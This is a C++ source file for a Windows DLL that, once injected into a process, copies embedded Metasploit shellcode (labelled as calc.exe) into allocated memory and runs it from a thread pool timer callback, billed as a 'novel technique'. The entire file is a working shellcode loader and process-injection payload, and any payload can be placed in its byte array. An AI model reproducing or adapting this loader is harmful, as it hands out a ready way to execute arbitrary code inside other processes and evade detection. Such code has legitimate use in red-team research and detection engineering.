// TimerDLL.cpp 
#include "pch.h"  
#include <Windows.h>
#include <stdio.h>
#include <threadpoolapiset.h>

// Metasploit calc.exe shellcode (for demonstration)
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

PTP_TIMER g_timer = NULL;
PVOID g_execMemory = NULL;

void LogMessage(const char* message) {
    HANDLE hFile = CreateFile(L"C:\\temp\\timer_log.txt", GENERIC_WRITE, 0, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);

        SYSTEMTIME st;
        GetSystemTime(&st);
        char timestampedMsg[512];
        sprintf_s(timestampedMsg, sizeof(timestampedMsg),
            "[%02d:%02d:%02d.%03d] %s\n",
            st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, message);

        DWORD bytesWritten;
        WriteFile(hFile, timestampedMsg, strlen(timestampedMsg), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

// Timer callback function - This is where the novel technique executes
VOID CALLBACK TimerCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_TIMER timer) {
    // Get the current process ID and thread ID for logging
    DWORD processId = GetCurrentProcessId();
    DWORD threadId = GetCurrentThreadId();

    char logMessage[256];
    sprintf_s(logMessage, sizeof(logMessage),
        "Timer callback fired! PID: %lu, TID: %lu, Context: 0x%p",
        processId, threadId, context);
    LogMessage(logMessage);

    // Change memory protection to executable
    DWORD oldProtect;
    if (VirtualProtect(context, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        LogMessage("Memory protection changed to executable");

        // Execute shellcode
        LogMessage("Executing shellcode via timer callback...");
        ((void(*)())context)();

        LogMessage("Shellcode execution completed successfully");
    }
    else {
        char errorMsg[128];
        sprintf_s(errorMsg, sizeof(errorMsg),
            "Failed to change memory protection. Error: %lu", GetLastError());
        LogMessage(errorMsg);
    }
}

// Function to set up timer-based execution
BOOL SetupTimerExecution() {
    LogMessage("Setting up timer-based execution...");

    // Allocate memory for shellcode
    g_execMemory = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_execMemory) {
        LogMessage("Failed to allocate memory for shellcode");
        return FALSE;
    }

    char memMsg[128];
    sprintf_s(memMsg, sizeof(memMsg), "Allocated memory at: 0x%p", g_execMemory);
    LogMessage(memMsg);

    // Copy shellcode to allocated memory
    memcpy(g_execMemory, shellcode, sizeof(shellcode));
    LogMessage("Shellcode copied to allocated memory");

    // Initialize thread pool callback environment
    TP_CALLBACK_ENVIRON callbackEnv;
    InitializeThreadpoolEnvironment(&callbackEnv);
    LogMessage("Thread pool callback environment initialized");

    // Create thread pool timer - This is the core of the novel technique
    g_timer = CreateThreadpoolTimer(TimerCallback, g_execMemory, &callbackEnv);
    if (!g_timer) {
        LogMessage("Failed to create thread pool timer");
        VirtualFree(g_execMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    LogMessage("Thread pool timer created successfully");

    // Set timer to fire after 3 seconds (for demonstration)
    FILETIME dueTime;
    ULONGLONG delay = (ULONGLONG)-(3 * 10000000LL); // 3 seconds
    dueTime.dwHighDateTime = (DWORD)(delay >> 32);
    dueTime.dwLowDateTime = (DWORD)(delay & 0xFFFFFFFF);

    SetThreadpoolTimer(g_timer, &dueTime, 0, 0);
    LogMessage("Timer set to fire in 3 seconds");

    return TRUE;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        // Create directory for logging
        CreateDirectory(L"C:\\temp", NULL);

        // Log DLL injection
        char injectionMsg[256];
        sprintf_s(injectionMsg, sizeof(injectionMsg),
            "TimerDLL.dll injected into process PID: %lu", GetCurrentProcessId());
        LogMessage(injectionMsg);

        // Set up timer-based execution
        if (SetupTimerExecution()) {
            LogMessage("Timer-based execution setup completed successfully");
        }
        else {
            LogMessage("Failed to setup timer-based execution");
        }
        break;

    case DLL_PROCESS_DETACH:
        LogMessage("DLL_PROCESS_DETACH - Cleaning up resources");

        if (g_timer) {
            CloseThreadpoolTimer(g_timer);
            g_timer = NULL;
        }

        if (g_execMemory) {
            VirtualFree(g_execMemory, 0, MEM_RELEASE);
            g_execMemory = NULL;
        }

        LogMessage("Cleanup completed");
        break;
    }
    return TRUE;
}